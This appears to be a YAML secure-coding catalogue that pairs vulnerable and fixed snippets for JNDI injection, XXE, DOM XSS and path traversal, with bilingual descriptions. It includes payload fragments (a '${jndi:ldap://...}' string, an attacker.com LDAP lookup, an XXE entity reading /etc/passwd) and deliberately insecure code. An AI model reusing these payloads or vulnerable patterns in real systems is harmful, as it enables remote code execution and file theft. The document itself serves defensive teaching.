- id: cat_1_research10
  name: JNDI Injection (Log4Shell)
  severity: Critical
  difficulty: Unknown
  confidence: POSSIBLE
  cwe:
  - CWE-917
  - CWE-502
  desc: JNDI zostało zaprojektowane, by pobierać i tworzyć instancje zdalnych obiektów Java — przekazanie niezaufanego stringa do InitialContext.lookup() (albo, jak w Log4Shell, zalogowanie stringa zawierającego ${jndi:ldap://...}) powoduje pobranie i wykonanie zdalnej klasy. To nie klasyczna składnia do ominięcia — to nadużycie funkcji działającej dokładnie tak jak zaprojektowano. CVE-2021-44228 uzyskało idealne CVSS 10.0.
  desc_en: JNDI is designed to fetch and instantiate remote Java objects — passing untrusted input into InitialContext.lookup() (or, as in Log4Shell, merely logging a string containing ${jndi:ldap://...}) causes a remote class to be fetched and executed. This isn't syntax to escape — it's abuse of a feature working exactly as built. CVE-2021-44228 scored a perfect CVSS 10.0.
  lang: java
  vuln: '// VULNERABLE

    String name = request.getParameter("resource");   // attacker-controlled

    Object obj = new InitialContext().lookup(name);    // ldap://attacker.com/Exploit -> RCE

    '
  safe: "// SECURE — allow-list logical names, never let scheme/host be user-controlled\nprivate static final Set<String> ALLOWED = Set.of(\"jdbc/AppDB\", \"jdbc/ReportDB\");\nString name = request.getParameter(\"resource\");\nif (!ALLOWED.contains(name)) {\n    throw new SecurityException(\"Disallowed JNDI name\");\n}\nObject obj = new InitialContext().lookup(name);\n"
- id: cat_1_research11
  name: XML External Entity (XXE) Injection
  severity: Critical
  difficulty: Unknown
  confidence: POSSIBLE
  cwe:
  - CWE-611
  - CWE-827
  - CWE-776
  desc: Parser XML rozwiązujący encje zewnętrzne z niezaufanego wejścia — DOCTYPE deklarujący <!ENTITY x SYSTEM "file:///etc/passwd"> powoduje odczyt dowolnego pliku, a ten sam mechanizm może wskazywać na wewnętrzne URL-e (SSRF, metadane chmury) lub, przez encje parametryczne i zewnętrzny DTD atakującego, eksfiltrować dane w pełni ślepo (out-of-band). Realne łańcuchy (XXE → SSRF → przejęcie admina, jak w Zimbra CVE-2019-9670) eskalują do RCE.
  desc_en: An XML parser resolving external entities from untrusted input — a DOCTYPE declaring <!ENTITY x SYSTEM "file:///etc/passwd"> reads an arbitrary file, and the same mechanism can target internal URLs (SSRF, cloud metadata) or, via parameter entities and an attacker-hosted external DTD, exfiltrate data fully blind (out-of-band). Real chains (XXE → SSRF → admin takeover, as in Zimbra CVE-2019-9670) escalate to RCE.
  lang: java
  vuln: '// VULNERABLE — default factory resolves DTDs & external entities

    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    Document doc = dbf.newDocumentBuilder().parse(input);

    '
  safe: '// SECURE — disallow DOCTYPE entirely

    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

    dbf.setXIncludeAware(false);

    dbf.setExpandEntityReferences(false);

    Document doc = dbf.newDocumentBuilder().parse(input);

    '
- id: cat_1_research12
  name: Cross-Site Scripting (XSS)
  severity: Critical
  difficulty: Unknown
  confidence: POSSIBLE
  cwe:
  - CWE-79
  - CWE-80
  - CWE-83
  - CWE-87
  desc: 'XSS pozwala atakującemu wstrzyknąć skrypt wykonywany przez przeglądarkę ofiary w kontekście zaufanej strony. Warianty: reflected (odbite z żądania), stored (zapisane i serwowane każdemu widzowi, zdolne do propagacji jako robak), DOM-based (żyje wyłącznie w JS klienta, może nigdy nie dotrzeć do serwera) i mutation XSS/mXSS (znacznik czysty dla sanitizera mutuje w wykonywalny kod przy ponownym parsowaniu przez przeglądarkę — realne, powracające obejścia DOMPurify, sanitizera używanego w tym projekcie).'
  desc_en: 'XSS lets an attacker inject script that the victim''s browser executes in the trusted site''s context. Variants: reflected (echoed from the request), stored (persisted and served to every viewer, worm-capable), DOM-based (lives entirely in client JS, may never reach the server), and mutation XSS/mXSS (sanitizer-clean markup mutates into executable code on browser re-parse — a real, recurring DOMPurify bypass class, the exact sanitizer this project uses).'
  lang: javascript
  vuln: '// VULNERABLE — untrusted DOM source into an HTML-parsing sink

    const q = decodeURIComponent(location.hash.slice(1));

    el.innerHTML = q;

    '
  safe: '// SECURE — text sink, no HTML parsing

    const q = decodeURIComponent(location.hash.slice(1));

    el.textContent = q;

    // If HTML is genuinely required: el.innerHTML = DOMPurify.sanitize(q);

    '
- id: cat_1_research13
  name: Path Traversal / Directory Traversal
  severity: Critical
  difficulty: Unknown
  confidence: POSSIBLE
  cwe:
  - CWE-22
  - CWE-23
  - CWE-36
  - CWE-73
  desc: Niezaufane wejście użyte do budowy ścieżki plikowej bez weryfikacji, że rozwiązana ścieżka pozostaje w zamierzonym katalogu bazowym. Sekwencje ../ (lub ścieżka absolutna) wychodzą z piaskownicy, umożliwiając odczyt (kradzież poświadczeń, kluczy, źródła) lub zapis dowolnego pliku (nadpisanie configów, Zip Slip przy ekstrakcji archiwów) — a przy dołączaniu/wykonywaniu treści eskaluje do RCE. Nieuwierzytelnione instancje pre-auth (np. Pulse Connect Secure, CVE-2019-11510) oceniane są na CVSS 10.0.
  desc_en: Untrusted input used to build a filesystem path without verifying the resolved path stays inside an intended base directory. ../ sequences (or an absolute path) escape the sandbox, enabling arbitrary file read (credential/key/source theft) or write (config overwrite, Zip Slip via archive extraction) — and escalates to RCE when the traversed content is included or executed. Unauthenticated pre-auth instances (e.g. Pulse Connect Secure, CVE-2019-11510) rate CVSS 10.0.
  lang: python
  vuln: "# VULNERABLE — absolute name overrides the base entirely\ndef get_file(name):\n    path = os.path.join(\"/var/www/files\", name)\n    return open(path).read()\n"
  safe: "# SECURE — canonicalize, then verify containment\nBASE = os.path.realpath(\"/var/www/files\")\ndef get_file(name):\n    path = os.path.realpath(os.path.join(BASE, name))\n    if os.path.commonpath([path, BASE]) != BASE:\n        raise ValueError(\"path traversal blocked\")\n    return open(path).read()\n"
